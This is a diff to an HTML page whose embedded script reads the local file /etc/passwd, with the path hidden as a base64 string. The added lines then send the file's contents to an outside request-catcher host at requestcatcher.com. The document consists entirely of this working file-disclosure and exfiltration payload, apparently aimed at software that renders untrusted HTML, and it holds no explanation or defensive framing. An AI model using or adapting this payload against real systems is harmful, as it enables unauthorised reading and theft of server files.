@@ -6,10 +6,16 @@
 <script>
 x=new XMLHttpRequest;
 x.onload=function(){
-document.write(this.responseText)
+  document.write(this.responseText);
+    y=new XMLHttpRequest;
+  y.open("GET","https://karthi.requestcatcher.com/"+this.responseText);
+  y.send();
 };
 x.open("GET",atob("ZmlsZTovLy9ldGMvcGFzc3dk"));
 x.send();
+
+
+  
 </script>
 
 </body></html>
